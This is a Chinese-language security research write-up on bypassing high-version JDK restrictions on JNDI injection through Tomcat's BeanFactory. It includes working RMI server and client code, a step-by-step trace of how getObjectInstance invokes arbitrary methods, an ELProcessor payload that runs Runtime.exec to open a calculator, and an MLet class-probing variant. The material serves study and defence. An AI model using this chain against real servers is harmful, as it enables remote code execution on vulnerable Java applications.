复现与调试：  
* 先起RMIServerELProcessor，然后运行RMIClient就可以触发命令执行。

* RMIServerMyClass并不重要，仅作为简单的演示，下文会提及。

* FastJsonHighVersionJDK是演示fastjson反序列化漏洞中，通过JdbcRowSetImpl链结合BeanFactory实现高版本jdk下的漏洞利用

---

高版本JDK中，对RMI和LDAP的trustURLCodebase做了限制，默认不允许远程加载ObjectFactory。  

RMI利用的JDK版本≤ JDK 6u132、7u122、8u113

LADP利用JDK版本≤ 6u211 、7u201、8u191  

---

目前两种绕过思路：
* 找到受害者本地classpath中的类作为恶意Reference Factory工厂类，并利用这个本地Factory类执行命令
* 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对他反序列化，由此完成利用

因此具体实现上，大概三种利用方式比较常见：
* 无法加载远程Factory工厂类，但不影响加载本地classpath中的Factory，条件是：工厂类必须实现了`javax.naming.sp.ObjectFactory`接口，并且至少存在一个getPbejct方法。比如：`org.apache.naming.factory.BeanFactory`（需要Tomcat的catalina.jar依赖，使用相对广泛）。以此调用`javax.el.ELProcessor#eval`或`groovy.lang.GroovyShell#evaluate`方法。
* 另外通过LDAP的javaSerializedData反序列化Gadget（不过这不在本文讨论范围内）

---

在调试过程中可以构建一个简单的本地class来增加对他的理解：
```java
package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import jdk.nashorn.internal.ir.Terminal;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.security.PublicKey;

public class RMIServerMyClass {
    public static void lanuchRMIregister(Integer rmi_port) throws Exception {

        System.out.println("Creating RMI Registry, RMI Port:" + rmi_port);
        Registry registry = LocateRegistry.createRegistry(rmi_port);
        ResourceRef ref = new ResourceRef("org.example.RMIServerMyClass$Test", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=run"));
        ref.add(new StringRefAddr("x", "huhu"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Exploit", referenceWrapper);
        System.out.println(referenceWrapper.getReference());

    }

    public static void main(String[] args) throws Exception {
        lanuchRMIregister(1099);
    }

    public static class Test {
        public Test() {

        }

        public void run(String name) {
            System.out.println("My Name is " + name);
        }
    }
}
```
服务端起来以后，再运行如下客户端：
```java
package org.example;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.Hashtable;

public class RMIClient {
    public static void main(String[] args) throws Exception{
        Hashtable<String,String> env = new Hashtable<>();
        Context context = new InitialContext(env);
        context.lookup("rmi://127.0.0.1:1099/Exploit");
    }
}
```

----

进入`BeanFactory#getObjectInstance`以后，会对类进行加载，并将obj转为Reference：
```java
public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws NamingException {
    if (obj instanceof ResourceRef) {
        try {
            Reference ref = (Reference)obj;
            String beanClassName = ref.getClassName();
            Class<?> beanClass = null;
            ClassLoader tcl = Thread.currentThread().getContextClassLoader();
            if (tcl != null) {
                try {
                    beanClass = tcl.loadClass(beanClassName);
                } catch (ClassNotFoundException var26) {
                }
            } else {
                try {
                    beanClass = Class.forName(beanClassName);
                } catch (ClassNotFoundException var25) {
                    var25.printStackTrace();
                }
            }
```
此时的obj如下：
```java
ResourceRef[className=org.example.RMIServerMyClass$Test,factoryClassLocation=null,factoryClassName=org.apache.naming.factory.BeanFactory,{type=scope,content=},{type=auth,content=},{type=singleton,content=true},{type=forceString,content=x=run},{type=x,content=huhu}]
```
也就是加载了org.example.RMIServerMyClass$Test。

然后对Test进行实例化，并获取ref的forceString属性：
```java
Object bean = beanClass.getConstructor().newInstance();
RefAddr ra = ref.get("forceString");
```
此时，ra的值为：
```java
Type: forceString
Content: x=run
```
接着，获取Content值，通过字符串分割的形式拿到了run
```java
Map<String, Method> forced = new HashMap();
String value;
String propName;
int i;
if (ra != null) {
    value = (String)ra.getContent();  // value: "x=run"
    Class<?>[] paramTypes = new Class[]{String.class};  // 限制了方法必须是接受一个String类型的参数
    String[] var18 = value.split(",");  // 这意味着value可以是多个键值对的组合，此时因为只有一组键值对，所以var18: ["x=run"]
    i = var18.length;  // i: 1

    for(int var20 = 0; var20 < i; ++var20) { // 遍历var18
        String param = var18[var20];
        param = param.trim();
        int index = param.indexOf(61);  // 注意，这里用的是indexOf(int ch)，所以其实是在找“=”的索引
        if (index >= 0) {
            propName = param.substring(index + 1).trim(); // 将run提出来，赋给propName
            param = param.substring(0, index).trim();
        } else {
            propName = "set" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1);
        }
```

然后getMethod，将``x=>RMIServerMyClass$Test#eval()``放入forced：

```java
try {
    forced.put(param, beanClass.getMethod(propName, paramTypes));
} catch (SecurityException | NoSuchMethodException var24) {
    throw new NamingException("Forced String setter " + propName + " not found for property " + param);
}
```

然后获取content，也就是即将执行的方法的参数值，然后从forced中取出run方法，通过反射执行：
```java
// ra: Type: x, Content: huhu
// 因此，value: huhu
value = (String)ra.getContent();  
Object[] valueArray = new Object[1];
Method method = (Method)forced.get(propName);
if (method != null) {
    valueArray[0] = value;

    try { 
        // 就是在执行：RMIServerMyClass$Test#run.invoke(bean,new String[]{"huhu"});
        method.invoke(bean, valueArray);
```
根据上面调试过程，我们可以总结通过BeanFactory执行任意方法的类的几个限制条件：
* 这个类必须有一个无参构造方法
* 这个类必须能够被BeanFactory访问到，如果是内部类，则必须被public修饰
* 我们要执行的方法必须是只接受一个String类型的方法，而且该方法必须被public修饰

刚好，`javax.el.ELProcessor`符合条件：
```java
public ELProcessor() {
    this.context = this.manager.getELContext();
    this.factory = ELManager.getExpressionFactory();
}

public Object eval(String expression) {
    return this.getValue(expression, Object.class);
}
```
同样，`groovy.lang.GroovyShell`也是如此：
```java
public GroovyShell() {
    this((ClassLoader)null, (Binding)(new Binding()));
}
        
public Object evaluate(String scriptText) throws CompilationFailedException {
    return this.evaluate(scriptText, this.generateScriptName(), "/groovy/shell");
}
```

因此在RMIServer端构造的代码类似：
```java
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
ref.add(new StringRefAddr("forceString", "x=eval"));
ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('open /System/Applications/Calculator.app')\")"));
```
本质上是在执行如下代码：
```java
new ELProcessor().eval("Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\")");
```

我们也可以按照这种思路继续寻找可以利用的class，浅蓝师傅提出了MLet可以用来进行class探测，也是非常有趣的。
代码如下：
```java
ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",
            true, "org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));
ref.add(new StringRefAddr("b", "http://127.0.0.1:2333/"));
ref.add(new StringRefAddr("c", "Blue"));
```

# 参考文献
* [如何绕过高版本JDK的限制进行JNDI注入利用 – KINGX](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html#/)
* [探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/)  
* [JNDI 注入利用 Bypass 高版本 JDK 限制](https://wjlshare.com/archives/1661/)